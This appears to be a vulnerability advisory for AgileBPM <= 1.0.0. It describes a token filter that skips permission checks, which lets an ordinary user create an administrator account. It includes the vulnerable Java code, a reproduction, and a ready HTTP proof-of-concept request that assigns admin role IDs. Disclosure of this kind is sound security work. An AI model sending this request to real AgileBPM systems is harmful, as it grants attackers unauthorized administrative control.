## 0x01 Introduction
<font style="color:rgb(30, 32, 36);">Shenzhen Dashi Tongzhou Information Technology Co., Ltd. is a diversified information technology company, focusing on software development, system integration and related technical services, committed to providing customers with a full range of IT solutions. AgileBPM is a powerful process platform, focusing on business online, automation!</font>

## 0x02 Vulnerability Overview
<font style="color:rgb(30, 32, 36);">AgileBPM has a vertical override vulnerability that allows an attacker to create an administrator account with common user rights and obtain admin permissions.</font>

## 0x03 Vulnerability version
<font style="color:rgb(30, 32, 36);">AgileBPM <= 1.0.0</font>

## 0x04 Code audit
In the doFilter method of \agile-bpm-basic-master\ab-auth\ab-auth-spring-security-oauth2\src\main\java\com\dstz\auth\filter\AuthorizationTokenCheckFilter.java, only the validation of whether the token is empty has been performed.

```plain
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
    HttpServletRequest req = (HttpServletRequest) request;

    // Handle anonymous interfaces
    if (this.isIngores(req)) {
        chain.doFilter(request, response);
        return;
    }

    String token = ServletUtil.getHeader(req, AUTHORIZATION, StrPool.EMPTY);
    // Check if the token is empty or only contains whitespace, or if it does not start with OAuth2AccessToken.BEARER_TYPE (usually "Bearer ").
    if (StrUtil.isBlank(token) || !token.trim().startsWith(OAuth2AccessToken.BEARER_TYPE)) {

        // Set the character encoding of the response to UTF-8 to ensure proper handling of response content characters.
        response.setCharacterEncoding(StandardCharsets.UTF_8.displayName());

        // Use the write method of the ServletUtil class to write a JSON-formatted failure message to the response,
        // with content generated by ApiResponse.fail. NO_AUTH_TOKEN.getCode() and NO_AUTH_TOKEN.getMessage() respectively
        // fetch the error code and message, and the response content type is set to application/json.
        ServletUtil.write((HttpServletResponse) response, JsonUtils.toJSONString(ApiResponse.fail(NO_AUTH_TOKEN.getCode(), NO_AUTH_TOKEN.getMessage())), MediaType.APPLICATION_JSON_VALUE);
    } else {
        // Continue executing the filter chain, calling the next filter or target resource, passing the request and response objects.
        chain.doFilter(request, response);
    }
}

```

Filterchain-class does not verify the permission level and expiration of the token.

![](https://cdn.nlark.com/yuque/0/2024/png/43117778/1733152561222-440b370b-0d88-4bf0-b2fd-43b3e30f12ed.png)

## **0x05 The vulnerability reappears**
Source code: [https://gitee.com/agile-bpm/agile-bpm-basic](https://gitee.com/agile-bpm/agile-bpm-basic)

Create the test account as a common user

![](https://cdn.nlark.com/yuque/0/2024/png/43117778/1733135149599-0e6bb5c8-e2eb-4957-a144-bea607dbdf23.png)

Login test does not have the user creation function

![](https://cdn.nlark.com/yuque/0/2024/png/43117778/1733135207724-597321dd-4164-4e38-9223-d98613299764.png)

The token is obtained by capturing packets

![](https://cdn.nlark.com/yuque/0/2024/png/43117778/1733135283702-0270b97a-7541-4dae-9f0a-20dbb68d0cfd.png)

roleid is a fixed value

![](https://cdn.nlark.com/yuque/0/2024/png/43117778/1733136697628-400c6a60-0741-4b81-932e-7cc752c60e37.png)

Use the token of test to create an administrator account.

![](https://cdn.nlark.com/yuque/0/2024/png/43117778/1733152506911-955592f4-7d49-42c9-b8b3-5d7d024da848.png)

If you log in to user1, you can find that it has the permission of admin

![](https://cdn.nlark.com/yuque/0/2024/png/43117778/1733136128851-d8bf802b-f503-4338-85a0-05d4007f8b9b.png)

pocï¼š

```plain
POST /api/ab-org/user/saveUserDto HTTP/1.1
Host: 192.168.187.129
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.187.129/org/user/userEdit
Content-Type: application/json;charset=UTF-8
Authorization: Bearer 5g3uN8tUtgMI4_Yz8mvwuIwJNvQ
Content-Length: 305
Origin: http://192.168.187.129
Connection: close
Priority: u=0

{"id":"","fullname":"user1","account":"user1","password":"123456","status":1,"orgRelationList":[{"type":"userRole","roleId":"1610480371538956288","roleName":""},{"type":"userRole","roleId":"1605464389708218368","roleName":""},{"type":"userRole","roleId":"1605464158287495168","roleName":""}],"address":""}
```





## 0x06 Repair Solution
Add Authorization authentication.



